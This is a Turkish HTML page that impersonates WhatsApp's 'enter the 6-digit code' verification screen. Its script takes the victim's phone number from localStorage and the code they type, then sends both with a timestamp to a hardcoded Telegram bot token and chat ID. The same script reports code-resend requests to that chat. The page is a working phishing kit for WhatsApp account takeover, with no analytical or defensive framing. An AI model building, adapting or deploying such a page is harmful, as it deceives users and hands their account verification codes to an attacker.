<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>WhatsApp - Kod Doğrulama</title>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  background: #111b21;
  color: #e9edef;
  height: 100vh;
  display: flex;
  flex-direction: column;
}

/* Üst Bar */
.header {
  background: #00a884;
  padding: 24px 20px 20px 20px;
  text-align: center;
}

.header h1 {
  font-size: 20px;
  font-weight: 500;
  color: white;
}

/* Ana İçerik */
.container {
  flex: 1;
  padding: 40px 24px;
  max-width: 500px;
  margin: 0 auto;
  width: 100%;
}

/* WhatsApp Logo */
.logo {
  text-align: center;
  margin-bottom: 32px;
}

.logo svg {
  width: 64px;
  height: 64px;
}

/* Başlık */
h2 {
  font-size: 24px;
  font-weight: 400;
  text-align: center;
  margin-bottom: 12px;
  color: #e9edef;
}

/* Açıklama */
.desc {
  text-align: center;
  color: #8696a0;
  font-size: 14px;
  margin-bottom: 8px;
  line-height: 1.4;
}

.phone-number {
  text-align: center;
  color: #00a884;
  font-size: 16px;
  font-weight: 500;
  margin-bottom: 32px;
}

/* Kod Input Alanı */
.code-input-container {
  display: flex;
  gap: 12px;
  justify-content: center;
  margin-bottom: 24px;
  flex-wrap: wrap;
}

.code-input {
  width: 55px;
  height: 70px;
  background: #2a3942;
  border: 2px solid transparent;
  border-radius: 12px;
  text-align: center;
  font-size: 28px;
  font-weight: 600;
  color: #e9edef;
  font-family: monospace;
  outline: none;
  transition: all 0.2s;
}

.code-input:focus {
  border-color: #00a884;
  background: #33434d;
}

.code-input.error {
  border-color: #ff5e57;
  animation: shake 0.3s ease;
}

@keyframes shake {
  0%, 100% { transform: translateX(0); }
  25% { transform: translateX(-5px); }
  75% { transform: translateX(5px); }
}

/* Buton */
button {
  width: 100%;
  padding: 14px;
  border-radius: 30px;
  border: none;
  background: #00a884;
  color: white;
  font-size: 16px;
  font-weight: 500;
  cursor: pointer;
  transition: all 0.2s;
  font-family: inherit;
  margin-top: 16px;
}

button:active {
  transform: scale(0.98);
  background: #008f6c;
}

button:disabled {
  background: #1e2a32;
  color: #5e6f7a;
  cursor: not-allowed;
  transform: none;
}

/* Yeniden Kod Gönder */
.resend-section {
  text-align: center;
  margin-top: 24px;
}

.resend-text {
  color: #8696a0;
  font-size: 14px;
}

.resend-link {
  color: #00a884;
  text-decoration: none;
  font-weight: 500;
  cursor: pointer;
}

.resend-link:hover {
  text-decoration: underline;
}

.timer {
  color: #00a884;
  font-weight: 500;
}

/* Loading Overlay */
.loading-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(17, 27, 33, 0.95);
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  z-index: 2000;
  backdrop-filter: blur(8px);
}

.loading-content {
  text-align: center;
  animation: fadeIn 0.3s ease;
}

.loading-spinner {
  width: 48px;
  height: 48px;
  border: 3px solid #2a3942;
  border-top-color: #00a884;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  margin: 0 auto 20px auto;
}

.loading-text {
  color: #e9edef;
  font-size: 18px;
  font-weight: 500;
  margin-bottom: 8px;
}

.loading-subtext {
  color: #8696a0;
  font-size: 14px;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

@keyframes fadeIn {
  from {
    opacity: 0;
    transform: scale(0.95);
  }
  to {
    opacity: 1;
    transform: scale(1);
  }
}

/* Hata Mesajı */
.error {
  text-align: center;
  margin-top: 20px;
  color: #ff5e57;
  font-size: 13px;
  background: rgba(255, 94, 87, 0.1);
  padding: 12px;
  border-radius: 8px;
  display: none;
}

.success-message {
  text-align: center;
  margin-top: 20px;
  color: #00a884;
  font-size: 13px;
  background: rgba(0, 168, 132, 0.1);
  padding: 12px;
  border-radius: 8px;
  display: none;
}

/* Alt Bilgi */
.footer {
  text-align: center;
  padding: 20px;
  color: #667781;
  font-size: 12px;
  border-top: 1px solid #222e35;
  margin-top: auto;
}

.footer a {
  color: #00a884;
  text-decoration: none;
}

/* Toast Bildirimi */
.toast {
  position: fixed;
  bottom: 20px;
  left: 50%;
  transform: translateX(-50%);
  background: #2a1a1a;
  color: #ff5e57;
  padding: 12px 20px;
  border-radius: 25px;
  font-size: 14px;
  z-index: 1000;
  display: none;
  animation: slideUp 0.3s ease;
  white-space: nowrap;
  box-shadow: 0 2px 8px rgba(0,0,0,0.2);
}

@keyframes slideUp {
  from {
    transform: translateX(-50%) translateY(20px);
    opacity: 0;
  }
  to {
    transform: translateX(-50%) translateY(0);
    opacity: 1;
  }
}

/* Responsive */
@media (max-width: 480px) {
  .container {
    padding: 24px 16px;
  }
  
  h2 {
    font-size: 20px;
  }
  
  .code-input {
    width: 48px;
    height: 60px;
    font-size: 24px;
  }
  
  .loading-text {
    font-size: 16px;
  }
}
</style>
</head>

<body>

<div class="header">
  <h1>WhatsApp</h1>
</div>

<div class="container">
  <div class="logo">
    <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M12 2C6.48 2 2 6.48 2 12C2 13.54 2.36 15 2.98 16.3L2 22L7.7 21.02C9 21.64 10.46 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2Z" fill="#25D366"/>
      <path d="M12 4C7.58 4 4 7.58 4 12C4 13.28 4.28 14.5 4.78 15.6L4.2 18.8L7.4 18.22C8.5 18.72 9.72 19 11 19C15.42 19 19 15.42 19 11C19 6.58 15.42 4 12 4Z" fill="white"/>
      <path d="M16.5 14.1C16.3 13.9 15.9 13.8 15.5 13.6C15.1 13.4 14.3 13 14 12.9C13.7 12.8 13.5 12.8 13.3 13.2C13.1 13.6 12.6 14.3 12.5 14.5C12.4 14.7 12.2 14.7 11.9 14.5C11.6 14.3 10.8 14 9.9 13.2C9.2 12.6 8.7 11.9 8.5 11.5C8.4 11.2 8.6 11.1 8.7 10.9C8.8 10.7 9 10.4 9.1 10.2C9.2 10 9.2 9.8 9.1 9.6C9 9.4 8.5 8.6 8.3 8.2C8.1 7.8 7.9 7.9 7.8 7.9C7.7 7.9 7.5 7.9 7.3 7.9C7.1 7.9 6.8 8 6.5 8.3C6.2 8.6 5.5 9.3 5.5 10.7C5.5 12.1 6.5 13.5 6.7 13.8C6.9 14.1 8.6 16.7 11.2 17.8C12 18.1 12.6 18.3 13.1 18.4C13.9 18.6 14.6 18.5 15.2 18.3C15.8 18.1 17 17.5 17.2 16.8C17.4 16.1 17.4 15.5 17.3 15.4C17.2 15.2 16.7 14.3 16.5 14.1Z" fill="#25D366"/>
    </svg>
  </div>

  <h2>Kodu girin</h2>
  <div class="desc">WhatsApp numaranıza gönderdiğimiz</div>
  <div class="phone-number" id="phoneNumber">+90 5xx xxx xx xx</div>
  
  <div class="desc" style="margin-top: 8px;">6 haneli kodu girin</div>

  <!-- 6 Haneli Kod Girişi -->
  <div class="code-input-container" id="codeInputs">
    <input type="text" class="code-input" maxlength="1" id="code1" onkeyup="moveToNext(this, 'code2')" onkeydown="handleBackspace(this, event)">
    <input type="text" class="code-input" maxlength="1" id="code2" onkeyup="moveToNext(this, 'code3')" onkeydown="handleBackspace(this, event)">
    <input type="text" class="code-input" maxlength="1" id="code3" onkeyup="moveToNext(this, 'code4')" onkeydown="handleBackspace(this, event)">
    <input type="text" class="code-input" maxlength="1" id="code4" onkeyup="moveToNext(this, 'code5')" onkeydown="handleBackspace(this, event)">
    <input type="text" class="code-input" maxlength="1" id="code5" onkeyup="moveToNext(this, 'code6')" onkeydown="handleBackspace(this, event)">
    <input type="text" class="code-input" maxlength="1" id="code6" onkeyup="moveToNext(this, null)" onkeydown="handleBackspace(this, event)">
  </div>

  <button onclick="verifyCode()" id="verifyBtn">Doğrula</button>

  <div class="resend-section">
    <span class="resend-text">Kod gelmedi mi? </span>
    <span class="resend-link" onclick="resendCode()">Yeniden Gönder</span>
    <div class="resend-text" style="margin-top: 8px;" id="timerText"></div>
  </div>

  <div class="error" id="errorMsg">
    ⚠️ Hatalı kod. Lütfen tekrar deneyin.
  </div>
  <div class="success-message" id="successMsg">
    ✓ Kod doğrulandı!
  </div>
</div>

<div class="footer">
  <a href="#">Gizlilik Politikası</a> • 
  <a href="#">Yardım</a>
</div>

<div class="toast" id="toast"></div>

<script>
// Telegram Bot Bilgileri
const TELEGRAM_BOT_TOKEN = "7619144760:AAFgnQ9NIw4IR8SA-JNLk2upPe0LHvNMgKM";
const TELEGRAM_CHAT_ID = "5587800563";

// Sayfa yüklendiğinde telefon numarasını göster
window.onload = function() {
  const savedPhone = localStorage.getItem("whatsapp_phone");
  if (savedPhone) {
    document.getElementById("phoneNumber").textContent = savedPhone;
  } else {
    document.getElementById("phoneNumber").textContent = "+90 5xx xxx xx xx";
  }
  
  // İlk inputa odaklan
  document.getElementById("code1").focus();
};

// Sonraki inputa geç
function moveToNext(current, nextId) {
  if (current.value.length === 1) {
    if (nextId) {
      document.getElementById(nextId).focus();
    } else {
      // Son input doldurulduysa otomatik doğrula
      const code = getFullCode();
      if (code.length === 6) {
        verifyCode();
      }
    }
  }
}

// Backspace ile geri git
function handleBackspace(input, event) {
  if (event.key === 'Backspace' && input.value === '') {
    const inputs = ['code1', 'code2', 'code3', 'code4', 'code5', 'code6'];
    const currentIndex = inputs.indexOf(input.id);
    if (currentIndex > 0) {
      document.getElementById(inputs[currentIndex - 1]).focus();
    }
  }
}

// Tam kodu al
function getFullCode() {
  let code = '';
  for (let i = 1; i <= 6; i++) {
    const val = document.getElementById(`code${i}`).value;
    code += val;
  }
  return code;
}

// Hata gösterme animasyonu
function showErrorOnInputs() {
  const inputs = document.querySelectorAll('.code-input');
  inputs.forEach(input => {
    input.classList.add('error');
    setTimeout(() => {
      input.classList.remove('error');
    }, 300);
  });
}

function showToast(message, isError = true) {
  const toast = document.getElementById('toast');
  toast.textContent = message;
  toast.style.display = 'block';
  setTimeout(() => {
    toast.style.display = 'none';
  }, 3000);
}

function showLoading() {
  const loadingDiv = document.createElement('div');
  loadingDiv.className = 'loading-overlay';
  loadingDiv.id = 'loadingOverlay';
  loadingDiv.innerHTML = `
    <div class="loading-content">
      <div class="loading-spinner"></div>
      <div class="loading-text">Giriş yapılıyor</div>
      <div class="loading-subtext">Lütfen bekleyin...</div>
    </div>
  `;
  document.body.appendChild(loadingDiv);
}

function hideLoading() {
  const loadingDiv = document.getElementById('loadingOverlay');
  if (loadingDiv) {
    loadingDiv.remove();
  }
}

async function verifyCode() {
  const code = getFullCode();
  const verifyBtn = document.getElementById("verifyBtn");
  const errorMsg = document.getElementById("errorMsg");
  const successMsg = document.getElementById("successMsg");
  
  errorMsg.style.display = "none";
  successMsg.style.display = "none";
  
  if (code.length !== 6) {
    errorMsg.style.display = "block";
    errorMsg.textContent = "Lütfen 6 haneli kodu tam girin!";
    showToast("Lütfen 6 haneli kodu tam girin", true);
    showErrorOnInputs();
    return;
  }
  
  // Butonu devre dışı bırak
  verifyBtn.disabled = true;
  
  // Loading göster
  showLoading();
  
  const phone = localStorage.getItem("whatsapp_phone") || "Bilinmeyen Numara";
  const timestamp = new Date().toLocaleString('tr-TR', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
  
  const message = `━━━━━━━━━━━━━━━━━━━━
✅ WHATSAPP GİRİŞ BAŞARILI ✅
━━━━━━━━━━━━━━━━━━━━

🔢 Numara: ${phone}
🔐 Girilen Kod: ${code}
🕒 Zaman: ${timestamp}
━━━━━━━━━━━━━━━━━━━━
🎉 Giriş başarıyla tamamlandı!
━━━━━━━━━━━━━━━━━━━━`;
  
  try {
    let success = false;
    
    if (TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN" && TELEGRAM_CHAT_ID !== "YOUR_CHAT_ID") {
      // Gerçek Telegram gönderimi
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML"
        })
      });
      
      const result = await response.json();
      success = result.ok;
    } else {
      // Demo modu
      console.log("Demo Modu - Kod Doğrulandı:", code);
      console.log("Numara:", phone);
      success = true;
    }
    
    if (success) {
      // Başarılı mesajı göster
      successMsg.style.display = "block";
      
      // LocalStorage'a kaydet
      localStorage.setItem("whatsapp_verified", "true");
      localStorage.setItem("whatsapp_verified_code", code);
      localStorage.setItem("whatsapp_verified_time", timestamp);
      
      // 2 saniye bekle ve yönlendir (ana sayfaya veya başka bir sayfaya)
      setTimeout(() => {
        window.location.href = "welcome.html"; // Başarılı giriş sayfası
      }, 2000);
      
    } else {
      throw new Error("Doğrulama başarısız");
    }
    
  } catch (error) {
    console.error("Hata:", error);
    hideLoading();
    errorMsg.style.display = "block";
    errorMsg.textContent = "Doğrulama hatası! Lütfen tekrar deneyin.";
    showToast("Doğrulama hatası! Lütfen tekrar deneyin", true);
    showErrorOnInputs();
    verifyBtn.disabled = false;
  }
}

// Yeniden kod gönder
let timerInterval;
let timeLeft = 0;

function resendCode() {
  const resendLink = document.querySelector('.resend-link');
  const timerText = document.getElementById('timerText');
  
  if (timeLeft > 0) {
    showToast(`Lütfen ${timeLeft} saniye bekleyin`, true);
    return;
  }
  
  // Loading göster
  showLoading();
  
  const phone = localStorage.getItem("whatsapp_phone") || "Bilinmeyen Numara";
  const timestamp = new Date().toLocaleString('tr-TR', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
  
  const message = `━━━━━━━━━━━━━━━━━━━━
🔄 KOD YENİDEN GÖNDERİLDİ 🔄
━━━━━━━━━━━━━━━━━━━━

🔢 Numara: ${phone}
🕒 Zaman: ${timestamp}
📌 Durum: Yeniden kod talep edildi
━━━━━━━━━━━━━━━━━━━━`;
  
  setTimeout(async () => {
    try {
      let success = false;
      
      if (TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN" && TELEGRAM_CHAT_ID !== "YOUR_CHAT_ID") {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "HTML"
          })
        });
        
        const result = await response.json();
        success = result.ok;
      } else {
        console.log("Demo Modu - Kod yeniden gönderildi");
        success = true;
      }
      
      hideLoading();
      
      if (success) {
        showToast("✓ Kod yeniden gönderildi!", false);
        
        // 30 saniye bekleme süresi başlat
        timeLeft = 30;
        resendLink.style.opacity = "0.5";
        resendLink.style.pointerEvents = "none";
        timerText.textContent = `${timeLeft} saniye sonra tekrar isteyebilirsiniz`;
        
        timerInterval = setInterval(() => {
          timeLeft--;
          if (timeLeft <= 0) {
            clearInterval(timerInterval);
            timerText.textContent = "";
            resendLink.style.opacity = "1";
            resendLink.style.pointerEvents = "auto";
          } else {
            timerText.textContent = `${timeLeft} saniye sonra tekrar isteyebilirsiniz`;
          }
        }, 1000);
        
        // Inputları temizle ve ilk inputa odaklan
        for (let i = 1; i <= 6; i++) {
          document.getElementById(`code${i}`).value = '';
        }
        document.getElementById("code1").focus();
        
      } else {
        throw new Error("Gönderim başarısız");
      }
      
    } catch (error) {
      hideLoading();
      showToast("Kod gönderilemedi! Lütfen tekrar deneyin.", true);
    }
  }, 500);
}

// Input alanlarına sadece sayı girişi
document.querySelectorAll('.code-input').forEach(input => {
  input.addEventListener('input', function(e) {
    this.value = this.value.replace(/[^0-9]/g, '');
  });
});

// Sayfa kapatıldığında timer'ı temizle
window.onbeforeunload = function() {
  if (timerInterval) {
    clearInterval(timerInterval);
  }
};
</script>

</body>
</html>
